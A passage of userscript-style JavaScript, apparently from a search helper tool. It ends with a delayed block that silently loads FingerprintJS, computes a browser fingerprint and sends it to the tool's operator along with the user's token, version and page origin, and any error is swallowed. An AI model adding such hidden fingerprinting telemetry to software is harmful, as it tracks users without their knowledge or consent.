1-33.28 15.786666 42.666667 42.666667 0 0 1-26.453334-9.386666z m-100.266666-55.04A42.666667 42.666667 0 0 1 597.333333 135.253333a42.666667 42.666667 0 0 1 54.186667-26.026666 42.666667 42.666667 0 0 1 26.453333 54.186666 42.666667 42.666667 0 0 1-37.973333 28.586667 37.973333 37.973333 0 0 1-14.933333-2.133333z" p-id="6996" fill="#006eff"></path></svg>
  \u641c\u7d22\u4e2d...
  </div>
        `
    }

    setTimeout(async () => {
        try {
            let t = MyTool.getValue("newToken") || localStorage.getItem("newToken") || "\u672a\u7ed1\u5b9a";
            var e = MyTool.getValue("cllData");
            (!e || new Date(e).getDate() < (new Date).getDate()) && MyTool.cllData(`v=${version}&schoolType=${st}&toolkey=${t}&host=` + location.origin);
            let o = localStorage.getItem("fingerprint");
            !o && t && import("https://openfpcdn.io/fingerprintjs/v4").then(e => e.load()).then(e => e.get()).then(e => (o = e.visitorId, e.visitorId)).then(e => {
                localStorage.setItem("fingerprint", o || ""), MyTool.cllData(`?v=${version}&schoolType=${st}&toolkey=${t}&fingerprint=${o}&host=` + location.origin)
            })
        } catch (e) {
        }
    }, 2500)
}();






